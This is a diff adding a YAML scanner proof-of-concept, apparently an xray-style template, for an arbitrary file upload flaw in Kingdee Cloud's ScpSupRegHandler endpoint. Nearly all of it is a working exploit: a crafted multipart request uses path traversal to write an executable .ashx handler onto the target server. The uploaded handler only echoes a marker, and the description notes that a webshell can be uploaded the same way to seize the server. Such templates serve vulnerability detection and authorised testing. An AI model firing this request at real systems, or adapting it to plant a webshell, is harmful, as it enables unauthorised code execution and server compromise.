@@ -1,0 +1,48 @@
+name: poc-yaml-kingdee-cloud-fileupload
+set:
+  r1: randomLowercase(8)
+groups:
+  detect:
+    - method: GET
+      path: /k3cloud/
+      follow_redirects: false
+      expression: >
+        response.status == 200 && (response.body.bcontains(b"金蝶") || response.body.bcontains(b"Kingdee"))
+  upload:
+    - method: POST
+      path: /k3cloud/SRM/ScpSupRegHandler
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{r1}}
+      body: >-
+        ------WebKitFormBoundary{{r1}}
+        Content-Disposition: form-data; name="dbId_v"
+
+        .
+        ------WebKitFormBoundary{{r1}}
+        Content-Disposition: form-data; name="FID"
+
+        2022
+        ------WebKitFormBoundary{{r1}}
+        Content-Disposition: form-data; name="FAtt"; filename="../../../../uploadfiles/{{r1}}.ashx."
+        Content-Type: text/plain
+
+        <%@ WebHandler Language="C#" Class="TestHandler" %>
+        using System;
+        using System.Web;
+        public class TestHandler : IHttpHandler {
+            public void ProcessRequest (HttpContext context) {
+                context.Response.ContentType= "text/plain";
+                context.Response.Write("{{r1}}");
+            }
+            public bool IsReusable { get {return false; } }
+        }
+        ------WebKitFormBoundary{{r1}}--
+      follow_redirects: false
+      expression: >
+        response.status == 200 && (response.body.bcontains(b"success") || response.body.bcontains(b"true") || response.body.bcontains(b"{{r1}}"))
+detail:
+  author: L4xy
+  description: "金蝶云星空ScpSupRegHandler接口存在任意文件上传漏洞，攻击者可通过路径遍历上传ashx/webshell文件获取服务器权限"
+  links:
+    - https://github.com/Threekiii/Awesome-POC/blob/master/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%87%91%E8%9D%B6OA%20%E4%BA%91%E6%98%9F%E7%A9%BA%20ScpSupRegHandler%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  tags: file-upload,kingdee,cloud
